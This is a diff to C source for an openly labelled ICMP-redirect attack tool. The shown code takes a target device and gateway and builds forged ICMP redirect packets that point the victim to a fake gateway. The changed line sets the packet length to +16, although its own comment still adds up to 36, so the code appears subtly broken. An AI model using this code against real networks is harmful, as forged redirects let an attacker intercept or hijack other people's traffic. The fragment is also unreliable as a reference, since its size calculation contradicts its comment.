@@ -6,8 +6,8 @@
  *    Description:  Performance a IMCP-Redirect Attack for fixed Device
  *                  Input args should be the given device ip and gateway
  *
- *        Version:  1.0
- *        Created:  2015年06月07日 21时02分30秒
+ *       Version:  1.0
+ *       Created:  2015年06月07日 21时02分30秒
  *       Revision:  none
  *       Compiler:  gcc
  *
@@ -83,7 +83,7 @@ void attackHost(uchar *args, const ppthdr  *header, const uchar *packet)
     unsigned short checksum;
     char **gw = (char **)args;//gw[0] is gateway, gw[1] is fakegateway
     IP *pscIp = (IP *)(packet + ETHER_SIZE);
-    ipLength = HEADERLEN + pscIp->ip_hl * 4 + 36;//头部并不一定都是20,再加上icmp的8字节头，20字节ipHeader，8字节ip数据
+    ipLength = HEADERLEN + pscIp->ip_hl * 4 + 16;//头部并不一定都是20,再加上icmp的8字节头，20字节ipHeader，8字节ip数据
     u1 *uPacketRaw = (u1 *)malloc(sizeof(u1) * ipLength);
     IP *pscAttack = (IP *)uPacketRaw;
     ICMP *pscAttackIcmp = (ICMP *)(uPacketRaw + HEADERLEN);
